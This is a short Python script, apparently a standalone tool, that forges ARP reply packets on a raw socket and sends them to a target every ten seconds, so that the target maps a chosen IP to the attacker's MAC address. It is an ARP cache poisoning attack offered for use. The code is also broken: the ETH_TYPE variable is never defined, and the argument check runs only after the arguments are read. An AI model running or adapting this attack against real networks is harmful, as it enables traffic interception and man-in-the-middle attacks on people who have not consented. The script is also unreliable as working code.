#!/usr/bin/env python3
import socket as sock
import sys
import time

# attacker MAC
SPOOFED_MAC = bytes.fromhex((sys.argv[1]).replace(":",""))
# ip to takeover
STOLEN_IP = sock.inet_aton(sys.argv[2])

# target MAC
DST_MAC = bytes.fromhex((sys.argv[3]).replace(":",""))
# target IP
DST_IP = sock.inet_aton(sys.argv[4])

if len(sys.argv) < 5:
    print("Missing args.")
    print("Usage: python3 arp_spoofer.py LOCAL_MAC STOLEN_IP DST_MAC DST_IP")
    sys.exit(1)

# 0x0001 - hardware, ethernet from IANA
# 0x0800 - protocol type, IPv4
# 0x06 - hardware length, 6 octets - MAC (??:??:??:??:??:??)
# 0x04 - protocol length, 4 octets - IP (???.???.???.???)
# 0x0002 - ARP Type, from IANA (1 request, 2 reply)
ARP_STRUC=b"\x00\x01\x08\x00\x06\x04\x00\x02"

# 0x0806 -> hex of 2054 -> ARP FROM IEEE 802
s = sock.socket(sock.AF_PACKET, sock.SOCK_RAW, sock.htons(0x0806))
s.bind(("eth0", 0)) # change as needed

# set eth frame
ETH_FRAME = DST_MAC + SPOOFED_MAC + ETH_TYPE

# set arp
ARP_HEADER = ARP_STRUC + SPOOFED_MAC + STOLEN_IP + DST_MAC + DST_IP

while True:
    s.send(ETH_FRAME + ARP_HEADER)
    time.sleep(10)
